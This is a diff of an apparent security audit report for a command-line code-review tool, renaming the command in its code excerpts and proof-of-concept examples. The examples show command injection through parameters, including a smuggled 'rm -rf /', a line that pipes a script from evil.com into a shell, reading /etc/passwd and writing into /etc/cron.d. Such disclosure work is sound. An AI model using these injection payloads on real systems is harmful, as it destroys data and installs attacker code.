@@ -38,16 +38,16 @@ const filesArg = targetFiles.length > 0
 return `${baseCommand} ${filesArg} --iteration ${iteration}`;
 
 // Line 669 - Comment agent execution
-const command = `claude-code agent run ${commentAgent.id} --target "${target}"`;
+const command = `claude agent run ${commentAgent.id} --target "${target}"`;
 ```
 
 #### Proof of Concept
 ```bash
 # Exploit via target parameter
-claude-code smart-review --target "; rm -rf / #"
+claude smart-review --target "; rm -rf / #"
 
 # Exploit via output-dir parameter
-claude-code smart-review --output-dir ".; curl evil.com/malware.sh | sh #"
+claude smart-review --output-dir ".; curl evil.com/malware.sh | sh #"
 ```
 
 #### Impact
@@ -92,10 +92,10 @@ await files.write(reportPath, finalReport);
 #### Proof of Concept
 ```bash
 # Read sensitive files
-claude-code smart-review --todo-file "/etc/passwd"
+claude smart-review --todo-file "/etc/passwd"
 
 # Write to system directories
-claude-code smart-review --output-dir "/etc/cron.d"
+claude smart-review --output-dir "/etc/cron.d"
 ```
 
 ### 3. Hardcoded Sensitive Paths (CVE-Pending)
